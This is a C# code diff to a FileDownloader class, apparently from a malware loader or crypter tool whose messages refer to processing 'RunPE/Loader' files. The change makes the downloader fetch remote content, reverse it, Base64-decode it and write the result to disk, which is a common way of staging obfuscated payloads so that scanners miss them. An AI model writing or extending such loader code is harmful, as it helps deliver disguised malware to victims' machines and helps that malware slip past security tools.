@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Text;
 
@@ -14,42 +15,46 @@ public class FileDownloader
     private const string DOWNLOAD_SUCCESS_MSG = "\n{0} download completed successfully.";
     private const string RUNPE_PROCESS_SUCCESS_MSG = "RunPE/Loader file processed and saved successfully.";
     private const string RUNPE_PROCESS_ERROR_MSG = "Error processing RunPE/Loader file: {0}";
-    public bool Download(string url, string savePath, string fileType)
+    public bool Download(string url, string savePath)
     {
         using (WebClient client = new WebClient())
         {
-            client.DownloadProgressChanged += (s, e) => 
-            {
-                ConsoleHelper.WriteLine($"{e.ProgressPercentage}%", ConsoleColor.Green, false);
-      
-            };
-
-            client.DownloadFileCompleted += (s, e) => 
-            {
-                if (e.Error == null)
-                {
-                    Console.ForegroundColor = ConsoleColor.Cyan;
-                    ConsoleHelper.WriteLine(string.Format(DOWNLOAD_SUCCESS_MSG, fileType), ConsoleColor.Green);
-                }
-                else
-                {
-                    ConsoleHelper.WriteLine(string.Format(DOWNLOAD_FAILED_HOST_MSG, fileType), ConsoleColor.Red);
-                }
-        
-            };
-
             try
             {
-                string fullPath = Path.Combine(savePath, Path.GetFileName(new Uri(url).LocalPath));
-                client.DownloadFileAsync(new Uri(url), fullPath);
-                while (client.IsBusy) System.Threading.Thread.Sleep(100);
+                string fileType = Path.GetFileNameWithoutExtension(new Uri(url).LocalPath);
+                ConsoleHelper.WriteLine($"Downloading {fileType}...", ConsoleColor.Cyan);
+
+                byte[] downloadedData = client.DownloadData(new Uri(url));
+
+                ConsoleHelper.WriteLine("Processing downloaded content...", ConsoleColor.Cyan);
+                string reversedBase64 = Encoding.UTF8.GetString(downloadedData);
+                string correctBase64 = new string(reversedBase64.Reverse().ToArray());
+
+                byte[] decodedData;
+                try
+                {
+                    decodedData = Convert.FromBase64String(correctBase64);
+                }
+                catch (FormatException)
+                {
+                    ConsoleHelper.WriteLine("Error: The downloaded content is not a valid Base64 string.", ConsoleColor.Red);
+                    return false;
+                }
+
+                File.WriteAllBytes(savePath, decodedData);
+
+                ConsoleHelper.WriteLine($"{fileType} downloaded and processed successfully.", ConsoleColor.Green);
+                ConsoleHelper.WriteLine($"Saved to: {savePath}", ConsoleColor.Green);
                 return true;
+            }
+            catch (WebException ex)
+            {
+                ConsoleHelper.WriteLine($"Download failed: {ex.Message}", ConsoleColor.Red);
+                return false;
             }
             catch (Exception ex)
             {
-                Console.ForegroundColor = ConsoleColor.Red;
-                ConsoleHelper.WriteLine(string.Format(DOWNLOAD_FAILED_HOST_MSG, fileType), ConsoleColor.Red);
-                Console.ResetColor();
+                ConsoleHelper.WriteLine($"An unexpected error occurred: {ex.Message}", ConsoleColor.Red);
                 return false;
             }
         }
